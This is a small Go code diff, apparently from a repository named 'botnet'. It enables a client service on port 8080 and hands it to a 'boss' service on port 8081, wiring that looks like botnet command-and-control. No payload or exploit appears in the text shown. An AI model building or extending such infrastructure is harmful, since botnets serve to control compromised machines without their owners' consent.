@@ -4,19 +4,20 @@ import (
 	"log"
 
 	"github.com/phanletrunghieu/botnet/server/service/boss"
+	"github.com/phanletrunghieu/botnet/server/service/client"
 )
 
 func main() {
-	// serviceClient := client.NewClientService(8080)
-	// go func() {
-	// 	err := <-serviceClient.Error
-	// 	log.Println(err)
-	// }()
+	serviceClient := client.NewClientService(8080)
+	go func() {
+		err := <-serviceClient.Error
+		log.Println(err)
+	}()
 
-	// go serviceClient.Run()
+	go serviceClient.Run()
 
 	// boss
-	serviceBoss := boss.NewBossService(8081)
+	serviceBoss := boss.NewBossService(8081, serviceClient)
 	go func() {
 		err := <-serviceBoss.Error
 		log.Println(err)
